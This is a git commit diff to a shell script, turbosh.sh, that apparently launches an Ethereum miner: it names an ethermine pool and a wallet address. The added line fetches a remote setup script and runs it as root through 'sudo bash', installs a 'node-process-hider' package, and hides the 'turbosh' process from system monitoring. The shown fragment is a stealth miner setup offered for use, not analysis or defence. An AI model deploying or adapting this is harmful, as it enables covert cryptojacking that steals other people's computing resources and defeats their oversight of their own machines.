004c825c3f2f1c6fbcf414bdbc652ad209978d19
nurdinkhalidhutapea <104282776+nurdinkhalidhutapea@users.noreply.github.com>
2022-04-24 08:23:24 +0800

    Update turbosh.sh

--- turbosh.sh
+++ turbosh.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add turbosh
 
 POOL=asia1.ethermine.org:4444
 WALLET=0x491fcd9921b694454fff2882836526177d4317a8
